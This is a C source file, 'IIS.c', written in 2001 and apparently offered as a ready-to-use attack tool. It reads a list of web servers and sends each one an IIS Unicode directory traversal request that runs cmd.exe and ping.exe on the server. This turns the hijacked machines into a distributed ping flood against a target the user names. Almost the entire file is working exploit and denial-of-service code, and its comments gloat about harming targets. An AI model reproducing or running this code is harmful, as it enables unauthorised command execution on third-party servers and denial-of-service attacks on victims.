/* 
IIS.c
Created by DoNkEy_BoNg on November 9th, 2001
Now you can be elite from DOS ;o
*/
#include <winsock.h>
#include <stdlib.h>
#include <stdio.h>

/* IP address structure chain */
typedef struct IPList {
   char IP[32];
   struct IPList *Next;
} IPList;

int main(int argc,char* argv[])
{
   SOCKET s;								/* Attack socket */
   SOCKADDR_IN sin;							/* Address info */
   LPHOSTENT lpHostEntry;					/* Hostname info */
   WSADATA wsa;								/* Winsock initilization */

   FILE *stream;							/* Pointer to file stream */
   char buffer[32];							/* Read buffer */
   char attackstr[1024];                                                /* Attack string to send */
   int num;                                                             /* Counter for number of hosts pinging */
   int hoststouse = 0;                                                  /* # of hosts to use */
   int sStat;								/* socket status */
   IPList Head;								/* Beginning of chain */
   IPList *curr;							/* Pointer to current location */
   IPList *last;                                                        /* Pointer to last IPList */
   int HostsSending = 0;                                                /* Number of hosts sucessfully sending attack */
   float result = 0;                                                    /* Success rate of attack */
   
   num = 0;

   /* Create beginning of chain */
   Head.IP[0] = '\0';
   Head.Next = (IPList*)malloc(sizeof(IPList));
   
   curr = Head.Next;

   printf("IIS Ping storm by DoNkEy_BoNg\n\n");

   /* Check for lameness */
   if (argc < 4)
   {
      printf("Insufficient arguments. Syntax:\nIIS <IP/Host> <Pings from each host> <Number of hosts>\n--------------------\nUse 0 for Number of hosts to use ALL hosts in file\n");
      return 1;
   }

   hoststouse = atoi(argv[3]);

   /* Open file */
   stream = fopen("iislist.txt","r");

   if (stream == (FILE *)0) {
      printf("Error opening iislist.txt, aborting...\n");
      return 1;
   }
   
   /* Read file for IP's and create chain */
   while (fgets(buffer,sizeof(buffer),stream) != NULL) {
		if (buffer[0] == '\n') continue;

		buffer[strlen(buffer) - 1] = '\0';
		strcpy(curr->IP,buffer);
		curr->Next = (IPList*)(malloc(sizeof(IPList)));
		curr = curr->Next;
                num++;
		if (num == hoststouse) break;
   }

   curr->Next = NULL;

   curr = Head.Next;

   WSAStartup(MAKEWORD(1,1),&wsa);

   /* Assign AF_INET family and port 80 */
   sin.sin_family = AF_INET;
   sin.sin_port = htons(80);

   while (curr->Next != NULL)
   {
		/* Main connection loop */
		printf("----------\nIP Address %s\n----------\n",curr->IP);
		printf("Checking hostname(%s)...",curr->IP);

		lpHostEntry = gethostbyname(curr->IP);
		if (lpHostEntry == NULL)
		{
                        printf("unknown hostname!\n");
		}
		else
		{
                        printf("found.\n");
			sin.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
			printf("Connecting socket...");
			s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
			sStat = connect(s,(LPSOCKADDR)&sin,sizeof(struct sockaddr));
			if (sStat == INVALID_SOCKET) {
                                printf("unable to connect!\n");
			}
			else
			{
				/* Time to fuck them over! */
                                printf("connected.\n");
				printf("Sending attack code...");
				strcpy(attackstr,"GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+PING.EXE");
				strcat(attackstr,"+\"-w\"+0+\"-v\"+ICMP+\"-l\"+65000+\"-n\"+");
				strcat(attackstr,argv[2]);
				strcat(attackstr,"+");
				strcat(attackstr,argv[1]);
				strcat(attackstr,"\n");
				sStat = send(s,attackstr,strlen(attackstr),0);
				if (sStat == SOCKET_ERROR)
				{
                                        printf("failed!\n");
				}
				else
				{
					printf("success!\n");
                                        HostsSending++;
				}
				closesocket(s);
			}
		}
		
		/* Next IP address */
                last = curr;
		curr = curr->Next;
                free(last);
   }
   result = 100 * HostsSending/num;
   printf(
   "\nAttack complete! Statistics:"
   "\n----------"
   "\nHosts sending: %d"
   "\nTotal hosts: %d"
   "\nSuccess rate: %f%%"
   "\nTotal pings sent to %s: %d"
   "\nTotal bytes sent to %s: %d"
   "\n",HostsSending,hoststouse,result,argv[1],atoi(argv[2]) * HostsSending,argv[1],atoi(argv[2]) * HostsSending * 65000);

   closesocket(s);
   WSACleanup();

   return 0;
   /* Peace/late */
}
